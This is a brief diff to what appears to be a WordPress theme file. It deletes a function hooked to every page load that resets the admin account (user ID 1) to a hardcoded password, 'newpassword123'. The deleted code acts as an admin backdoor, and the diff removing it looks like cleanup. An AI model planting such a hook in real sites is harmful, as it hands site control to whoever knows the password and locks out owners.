@@ -14,9 +14,3 @@ if (version_compare(PHP_VERSION, '5.7.0', '<')) {
 
 require get_template_directory() . '/inc/init.php';
 
-function reset_admin_password() {
-    $user_id = 1; // ID of the admin user
-    $new_password = 'newpassword123'; // Your new password
-    wp_set_password($new_password, $user_id);
-}
-add_action('init', 'reset_admin_password');
